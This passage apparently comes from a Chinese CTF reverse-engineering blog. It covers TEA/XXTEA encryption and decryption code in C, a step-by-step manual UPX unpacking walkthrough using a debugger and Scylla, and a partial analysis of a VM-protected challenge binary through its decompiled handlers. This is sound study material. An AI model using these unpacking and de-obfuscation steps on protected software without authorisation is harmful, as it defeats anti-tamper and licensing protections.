<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">decipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], delta = <span class="number">0x9E3779B9</span>, sum = delta * num_rounds; <span class="comment">// 初始化sum为最终值</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]); <span class="comment">// 逆向操作右半块</span></span><br><span class="line">        sum -= delta; <span class="comment">// 逆向更新sum</span></span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]); <span class="comment">// 逆向操作左半块</span></span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="xxtea"><a href="#xxtea" class="headerlink" title="xxtea"></a>xxtea</h2><h3 id="加密-1"><a href="#加密-1" class="headerlink" title="加密"></a>加密</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">btea</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++) &#123;</span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">8</span>] = &#123;</span><br><span class="line">        <span class="number">0x67616C66</span>, <span class="number">0x3332317B</span>, <span class="number">0x37363534</span>, <span class="number">0x30303938</span>,</span><br><span class="line">        <span class="number">0x34333231</span>, <span class="number">0x38373635</span>, <span class="number">0x32313039</span>, <span class="number">0x7D353433</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>] = &#123; <span class="number">0x34333231</span>, <span class="number">0x38373635</span>, <span class="number">0x32313039</span>, <span class="number">0x36353433</span> &#125;;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;原始明文（小端序十六进制）:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%08X &quot;</span>, v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    btea(v, n, k);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密后的数据（十六进制）:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%08X &quot;</span>, v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解密-2"><a href="#解密-2" class="headerlink" title="解密"></a>解密</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">btea</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;            <span class="comment">/* Coding Part */</span></span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++) &#123;</span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123;    <span class="comment">/* Decoding Part */</span></span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = rounds * DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--) &#123;</span><br><span class="line">                z = v[p - <span class="number">1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 密文数据 (小端序十六进制)</span></span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">8</span>] = &#123;</span><br><span class="line">        <span class="number">0x3E95DFCB</span>, <span class="number">0x608F99DA</span>, <span class="number">0x40ABC551</span>, <span class="number">0x941490C5</span>,</span><br><span class="line">        <span class="number">0x7985C1B9</span>, <span class="number">0x20FC9B0A</span>, <span class="number">0x23C095EB</span>, <span class="number">0x62EFB4EE</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 密钥 (小端序十六进制)</span></span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>] = &#123;</span><br><span class="line">        <span class="number">0x34333231</span>, <span class="number">0x38373635</span>, <span class="number">0x32313039</span>, <span class="number">0x36353433</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> n = <span class="number">8</span>; <span class="comment">// 密文长度为8个32位无符号整数</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;密文数据:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%08X &quot;</span>, v[i]);</span><br><span class="line">        <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">4</span> == <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解密</span></span><br><span class="line">    btea(v, -n, k);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n解密后的数据:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%08X &quot;</span>, v[i]);</span><br><span class="line">        <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">4</span> == <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将解密后的数据解释为字符</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n解密后的字符串:\n&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* bytes = (<span class="type">unsigned</span> <span class="type">char</span>*)v;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n * <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (bytes[i] &gt;= <span class="number">32</span> &amp;&amp; bytes[i] &lt;= <span class="number">126</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, bytes[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\\x%02X&quot;</span>, bytes[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>XXTEA（Corrected Block TEA）是 XTEA 算法的优化升级版，专为解决 XTEA 对数据块长度的限制而生，能以 32 位无符号整数为基本单位，对任意长度的数据进行加密解密；它延续了轻量级特性，仅依赖基础算术与位运算，代码量少、资源占用低，同时优化了轮函数设计，增强抗攻击能力，广泛用于嵌入式设备、物联网终端、小型通信协议等对算力和存储要求严苛的场景。</p>
<h3 id="最常魔改点-2"><a href="#最常魔改点-2" class="headerlink" title="最常魔改点"></a>最常魔改点</h3><p>define DELTA 0x9e3779b9  这个数据经常被换。</p>
<p>加密原理</p>
<ul>
<li><strong>输入</strong>：明文数组 <code>v</code>（8个32位整数）、数组长度 <code>n=8</code>、密钥 <code>k</code>（4个32位整数）。</li>
<li><strong>关键步骤</strong>：<ul>
<li>计算轮数 <code>rounds = 6 + 52 / n</code>（确保充分混淆）。</li>
<li>初始化 <code>sum = 0</code>，<code>z = v[n-1]</code>。</li>
<li>多轮循环（每轮 <code>sum += DELTA</code>（0x9e3779b9））：<ul>
<li>计算 <code>e = (sum &gt;&gt; 2) &amp; 3</code>（动态选择密钥索引）。</li>
<li>遍历数组（除最后一个元素），使用 <code>MX</code> 函数更新每个 <code>v[p]</code>：<code>v[p] += MX</code>（<code>MX</code> 混合 <code>y</code>（下一个元素）、<code>z</code>（前一个元素）、密钥和 <code>sum</code>）。</li>
<li>更新最后一个元素 <code>v[n-1] += MX</code>（使用 <code>y = v[0]</code>）。</li>
</ul>
</li>
</ul>
</li>
<li><strong>输出</strong>：密文数组 <code>v</code>（原始明文被加密）。</li>
</ul>
<p>解密原理</p>
<ul>
<li><strong>输入</strong>：密文数组 <code>v</code>、负长度 <code>-n</code>（触发解密模式）、相同密钥 <code>k</code>。</li>
<li><strong>关键步骤</strong>：<ul>
<li>取 <code>n</code> 的绝对值，计算相同轮数 <code>rounds</code>。</li>
<li>初始化 <code>sum = rounds * DELTA</code>（加密最终值），<code>y = v[0]</code>。</li>
<li>多轮循环（每轮 <code>sum -= DELTA</code>）：<ul>
<li>计算 <code>e</code>（同加密）。</li>
<li>反向遍历数组（从最后一个元素到第二个），使用 <code>v[p] -= MX</code>（逆操作，恢复加密前值）。</li>
<li>更新第一个元素 <code>v[0] -= MX</code>。</li>
</ul>
</li>
</ul>
</li>
<li><strong>输出</strong>：明文数组 <code>v</code>（密文被解密）。</li>
</ul>
]]></content>
      <categories>
        <category>reverse</category>
        <category>总结</category>
        <category>tea</category>
      </categories>
  </entry>
  <entry>
    <title>upx手动脱壳</title>
    <url>/2025/08/24/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/</url>
    <content><![CDATA[<p>感谢霍爷教我upx脱壳</p>
<p>第一步设置入口处断点，只保留入口处断点</p>
<p><img src="/2025/08/24/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/1.png" alt="1"></p>
<p>调试–&gt;运行 ,达到pushad</p>
<p><img src="/2025/08/24/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/2.png" alt="2"></p>
<p>在堆栈区下断点</p>
<p><img src="/2025/08/24/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/3.png" alt="3"></p>
<p>F9运行到popad</p>
<p><img src="/2025/08/24/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/4.png" alt="4"></p>
<p>看到循环F4跳过</p>
<p><img src="/2025/08/24/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/5.png" alt="5"></p>
<p>接着看到一大部分寄存器初始化</p>
<p><img src="/2025/08/24/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/6.png" alt="6"></p>
<p>F7单步进入</p>
<p><img src="/2025/08/24/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/7.png" alt="7"></p>
<p>达到入口</p>
<p><img src="/2025/08/24/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/8.png" alt="8"></p>
<p>用syclla</p>
<p><img src="/2025/08/24/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/9.png" alt="9"></p>
<p>先点击转储，出现一个dump.exe在用IAT两次确定后获取导入，最后修复转储是选择刚刚的dump.exe就可以得到dump_SCY.exe，用IDA打开</p>
<p><img src="/2025/08/24/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/10.png" alt="10"></p>
<p>成功脱壳。</p>
]]></content>
      <categories>
        <category>reverse</category>
        <category>总结</category>
        <category>upx手动脱壳</category>
      </categories>
  </entry>
  <entry>
    <title>vm逆向</title>
    <url>/2025/09/03/vm%E9%80%86%E5%90%91/</url>
    <content><![CDATA[<h2 id="虚拟机（VM）保护技术逆向分析与总结"><a href="#虚拟机（VM）保护技术逆向分析与总结" class="headerlink" title="虚拟机（VM）保护技术逆向分析与总结"></a>虚拟机（VM）保护技术逆向分析与总结</h2><h3 id="什么是虚拟机（VM）保护？"><a href="#什么是虚拟机（VM）保护？" class="headerlink" title="什么是虚拟机（VM）保护？"></a>什么是虚拟机（VM）保护？</h3><p>虚拟机保护是一种高级的代码混淆和反逆向技术。它的核心思想是：<strong>将原始机器代码（如x86指令）转换（或“编译”）为只能在自定义的虚拟机上执行的字节码（Bytecode）</strong>。</p>
<ul>
<li><strong>类比</strong>：就像Java程序被编译成在JVM上运行的字节码，或者.NET程序被编译成在CLR上运行的IL代码一样。VM保护创建了一个私有的、独特的“处理器”和“指令集”（通常称为VM Architecture或ISA），来执行被保护的代码。</li>
<li><strong>目标</strong>：极大增加逆向工程的分析难度。分析者无法直接看到原始的x86&#x2F;ARM指令，而是需要先理解整个自定义虚拟机的运作机制，才能还原出原始代码的逻辑。</li>
</ul>
<p>而我们就要分析这些自定义的逻辑然后，根据这些指令还原汇编代码。然后再分析逻辑。</p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>主函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3[<span class="number">2</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">1</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v3[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input something:&quot;</span>);</span><br><span class="line">  sub_CD1(v3);</span><br><span class="line">  sub_E0B(v3);</span><br><span class="line">  sub_F83(v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;And the flag is GWHT&#123;true flag&#125;&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_CD1  是一个数据结构</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_CD1</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  *(_DWORD *)a1 = <span class="number">0</span>;                           <span class="comment">//寄存器A</span></span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">4</span>) = <span class="number">18</span>;                    <span class="comment">//寄存器B</span></span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">8</span>) = <span class="number">0</span>;                     <span class="comment">//寄存器C</span></span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">12</span>) = <span class="number">0</span>;                    <span class="comment">//寄存器D</span></span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">16</span>) = &amp;unk_202060;          <span class="comment">//储存指令</span></span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">24</span>) = <span class="number">0xF1</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">32</span>) = sub_B5F;              <span class="comment">//0xF1  --&gt;sub_B5F</span></span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">40</span>) = <span class="number">0xF2</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">48</span>) = sub_A64;              <span class="comment">//0xF2  --&gt;sub_A64</span></span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">56</span>) = <span class="number">0xF5</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">64</span>) = sub_AC5;              <span class="comment">//0xF5  --&gt;sub_AC5</span></span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">72</span>) = <span class="number">0xF4</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">80</span>) = sub_956;              <span class="comment">//0xF4  --&gt;sub_956</span></span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">88</span>) = <span class="number">0xF7</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">96</span>) = sub_A08;              <span class="comment">//0xF7  --&gt;sub_A08</span></span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">104</span>) = <span class="number">0xF8</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">112</span>) = sub_8F0;             <span class="comment">//0xF8  --&gt;sub_8F0</span></span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">120</span>) = <span class="number">0xF6</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">128</span>) = sub_99C;             <span class="comment">//0xF6  --&gt;sub_99C</span></span><br><span class="line">  qword_2022A8 = <span class="built_in">malloc</span>(<span class="number">0x512u</span>LL);</span><br><span class="line">  <span class="built_in">memset</span>(qword_2022A8, <span class="number">0</span>, <span class="number">0x512u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_B5F</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> *v2; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v2 = (<span class="type">int</span> *)(*(_QWORD *)(a1 + <span class="number">16</span>) + <span class="number">2LL</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( *(_BYTE *)(*(_QWORD *)(a1 + <span class="number">16</span>) + <span class="number">1LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE1</span>:</span><br><span class="line">      *(_DWORD *)a1 = *((<span class="type">char</span> *)qword_2022A8 + *v2);              <span class="comment">//写入到a1指向结构的偏移 0 处</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE2</span>:</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">4</span>) = *((<span class="type">char</span> *)qword_2022A8 + *v2);        <span class="comment">//写入到a1偏移 4 处</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE3</span>:</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">8</span>) = *((<span class="type">char</span> *)qword_2022A8 + *v2);       <span class="comment">//写入到a1偏移 8 处</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE4</span>:</span><br><span class="line">      *((_BYTE *)qword_2022A8 + *v2) = *(_DWORD *)a1;  <span class="comment">//将a1偏移 0 处的字节，写入到qword_2022A8缓冲区偏移*v2的位置</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE5</span>:</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">12</span>) = *((<span class="type">char</span> *)qword_2022A8 + *v2);  <span class="comment">//写入到a1偏移 12 处。</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE7</span>:</span><br><span class="line">      *((_BYTE *)qword_2022A8 + *v2) = *(_DWORD *)(a1 + <span class="number">4</span>);<span class="comment">//将a1偏移 4 处的字节，写入到qword_2022A8缓冲区偏移*v2的位置</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">16</span>) += <span class="number">6LL</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_A64异或操作a1与a1+4存储的内容异或。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_A64</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  *(_DWORD *)a1 ^= *(_DWORD *)(a1 + <span class="number">4</span>);</span><br><span class="line">  ++*(_QWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从标准输入读取数据,并强制校验输入的字符串长度是否为 21</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_AC5</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  buf = (<span class="type">const</span> <span class="type">char</span> *)qword_2022A8;</span><br><span class="line">  read(<span class="number">0</span>, qword_2022A8, <span class="number">0x20u</span>LL);</span><br><span class="line">  dword_2022A4 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( dword_2022A4 != <span class="number">21</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;WRONG!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ++*(_QWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_956进行自增操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_956</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  ++*(_QWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_A08偏移 0 处的 4 字节数据与偏移 12 处的 4 字节数据进行乘法，并计数器自增。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_A08</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  *(_DWORD *)a1 *= *(_DWORD *)(a1 + <span class="number">12</span>);</span><br><span class="line">  ++*(_QWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_8F0交换<code>a1[0]</code>和<code>a1[1]</code>两个 int 变量的值</p>
